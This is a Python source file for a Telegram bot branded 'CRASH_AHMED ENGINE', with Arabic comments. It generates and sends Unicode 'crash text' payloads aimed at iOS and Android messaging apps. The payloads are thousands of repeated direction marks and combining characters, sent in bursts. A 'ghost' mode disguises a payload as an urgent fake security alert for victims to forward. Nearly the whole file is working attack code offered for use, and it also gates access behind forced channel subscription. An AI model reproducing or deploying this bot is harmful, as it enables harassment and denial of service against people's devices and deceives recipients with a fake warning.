import os
import telebot
from telebot import types
from flask import Flask
from threading import Thread
import config

# --- 1. خادم البقاء ---
app = Flask('')
@app.route('/')
def home(): return "Online"
def run(): app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
Thread(target=run).start()

# --- 2. إعداد البوت ---
bot = telebot.TeleBot(config.TOKEN)

# دالة التحقق
def check_sub(user_id):
    for channel in config.CHANNELS:
        try:
            status = bot.get_chat_member(channel['id'], user_id).status
            if status == 'left': return False
        except: continue
    return True

# --- 3. الواجهة (HTML) ---
@bot.message_handler(commands=['start'])
def start(message):
    welcome = "<b>☢️ [ ACCESS GRANTED ] ☢️</b>\n<b>⚠️ CRASH_AHMED ENGINE v9.9</b>"
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("⚡ ACTIVATE ⚡", callback_data="check"))
    bot.send_message(message.chat.id, welcome, reply_markup=markup, parse_mode="HTML")

@bot.callback_query_handler(func=lambda call: call.data == "check")
def verify(call):
    if check_sub(call.from_user.id):
        bot.send_message(call.message.chat.id, "😈 <b>أرسل .menu الآن!</b>", parse_mode="HTML")
    else:
        bot.answer_callback_query(call.id, "❌ اشترك أولاً!", show_alert=True)

@bot.message_handler(func=lambda m: m.text == ".menu")
def crash_menu(message):
    menu = "<b>☢️ CONTROL PANEL ☢️</b>\n\n🍎 <code>.crash_ios</code>\n🤖 <code>.crash_android</code>\n👻 <code>.crash_ghost</code>"
    bot.send_message(message.chat.id, menu, parse_mode="HTML")

# --- 4. الهجمات (الترتيب الصحيح) ---

@bot.message_handler(func=lambda m: m.text.startswith(".crash_ios"))
def execute_ios_crash(message):
    if message.from_user.id != config.ADMIN_ID: return
    target = message.text.split(" ")[1] if len(message.text.split(" ")) > 1 else "Target"
    payload = "🔥🔥" + ("\u200e" * 4000) + "😈" + ("\u200f" * 4000) + "💥"
    bot.reply_to(message, f"🚀 <b>جاري قصف {target}...</b>", parse_mode="HTML")
    for _ in range(5):
        bot.send_message(message.chat.id, f"💥 iOS_DESTROYER: {target}\n{payload}")

@bot.message_handler(func=lambda m: m.text.startswith(".crash_android"))
def execute_android_crash(message):
    if message.from_user.id != config.ADMIN_ID: return
    target = message.text.split(" ")[1] if len(message.text.split(" ")) > 1 else "Target"
    payload = ("\u0345" * 3300) + ("\u0ea3" * 3300)
    bot.reply_to(message, f"⚡ <b>إطلاق غاز الأعصاب على {target}...</b>", parse_mode="HTML")
    for _ in range(3):
        bot.send_message(message.chat.id, f"💥 ANDROID_CRASH: {target}\n☣️ {payload} 💀")

@bot.message_handler(func=lambda m: m.text.startswith(".crash_ghost"))
def execute_ghost_crash(message):
    fake = "📢 <b>عاجل: تم رصد نشاط مشبوه! اضغط قراءة المزيد...</b>\n\n"
    trap = ("\u200f" * 1000)
    payload = ("\u0345" * 2500) + ("\u0ea3" * 2500) + ("\u200e" * 2500)
    bot.reply_to(message, "🚀 <b>تم تجهيز الفخ! انسخ الرسالة التالية:</b>", parse_mode="HTML")
    bot.send_message(message.chat.id, f"{fake}{trap}{payload}")

# --- 5. السطر الأخير (يجب أن يبقى هنا دائماً) ---
bot.infinity_polling()
